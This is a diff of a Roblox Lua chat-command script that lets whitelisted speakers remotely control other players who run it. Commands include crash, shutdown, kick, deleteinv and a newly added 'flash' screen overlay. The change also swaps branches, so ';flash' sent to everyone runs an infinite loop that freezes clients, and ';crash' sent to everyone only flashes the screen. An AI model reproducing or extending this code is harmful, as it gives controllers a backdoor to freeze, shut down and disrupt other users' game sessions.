@@ -5,7 +5,7 @@ local Notify = function(_Title, _Text , Time)
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
-local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame⭐"
+local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -93,10 +93,71 @@ elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟⭐dead was here⭐🌟")
 
+elseif cmd == ";flash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+local flash = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+flash.Name = "flash"
+flash.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+flash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+flash.ResetOnSpawn = false
+Frame.Parent = flash
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.ClipsDescendants = true
+Frame.LayoutOrder = 1
+Frame.Position = UDim2.new(0, 0, -0.0626911297, 0)
+Frame.Size = UDim2.new(999, 9999, 9999, 9999)
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.000310489821, 0, 3.71029455e-05, 0)
+TextLabel.Size = UDim2.new(0, 548, 0, 218)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "You have been flashed!"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+wait(0.5)
+game.Players.LocalPlayer.PlayerGui.flash:Destroy()
+elseif cmd == ";flash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+while true do end
+
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 while true do end
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
-while true do end
+local flash = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+flash.Name = "flash"
+flash.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+flash.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+flash.ResetOnSpawn = false
+Frame.Parent = flash
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderSizePixel = 0
+Frame.ClipsDescendants = true
+Frame.LayoutOrder = 1
+Frame.Position = UDim2.new(0, 0, -0.0626911297, 0)
+Frame.Size = UDim2.new(999, 9999, 9999, 9999)
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.000310489821, 0, 3.71029455e-05, 0)
+TextLabel.Size = UDim2.new(0, 548, 0, 218)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "You have been flashed!"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+wait(0.5)
+game.Players.LocalPlayer.PlayerGui.flash:Destroy()
 
 elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 game:shutdown()
